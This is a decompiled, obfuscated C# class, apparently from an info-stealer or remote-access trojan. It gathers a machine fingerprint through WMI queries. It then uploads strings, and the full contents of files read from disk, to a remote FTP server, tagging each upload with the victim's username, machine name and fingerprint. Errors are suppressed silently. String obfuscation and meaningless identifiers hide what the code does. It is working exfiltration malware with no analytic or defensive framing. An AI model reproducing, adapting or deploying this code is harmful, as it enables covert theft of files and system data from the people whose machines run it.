using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HuHbCLeSgdQqCa;

internal sealed class BDPpVebqDYFaB
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string NubqmgjPcrtgA()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107411621));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107411632)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107411583);
		ManagementObject val3 = new ManagementObject(getString_0(107411578) + text2 + getString_0(107412081));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107412076)).ToString();
		return text3 + text;
	}

	public static void WDkTMgVLAmA(string GXMdKoBScNR = "URL", string idTsOktQwjdNGW = "USERNAME", string SrkIZjTqFmyB = "ACCESO", string RoQIatkALtHfj = "")
	{
		try
		{
			string text = NubqmgjPcrtgA();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(GXMdKoBScNR + getString_0(107412051) + Environment.UserName + getString_0(107412006) + Environment.MachineName + getString_0(107412017) + text + getString_0(107412012));
			ftpWebRequest.Method = getString_0(107411971);
			ftpWebRequest.Credentials = new NetworkCredential(idTsOktQwjdNGW, SrkIZjTqFmyB);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(RoQIatkALtHfj);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void envVzvenRkXe(string ZXuqhMivMzG = "URL", string jPNvyqTKgXtIhwnK = "USERNAME", string CPpCkWtlrNgKgeWb = "ACCESO", string SnJxZYgrFRuAt = "")
	{
		try
		{
			string text = NubqmgjPcrtgA();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ZXuqhMivMzG + getString_0(107412051) + Environment.UserName + getString_0(107412006) + Environment.MachineName + getString_0(107412017) + text + getString_0(107412012));
			ftpWebRequest.Method = getString_0(107411971);
			ftpWebRequest.Credentials = new NetworkCredential(jPNvyqTKgXtIhwnK, CPpCkWtlrNgKgeWb);
			byte[] bytes;
			using (StreamReader streamReader = new StreamReader(SnJxZYgrFRuAt))
			{
				bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			}
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	static BDPpVebqDYFaB()
	{
		Strings.CreateGetStringDelegate(typeof(BDPpVebqDYFaB));
	}
}
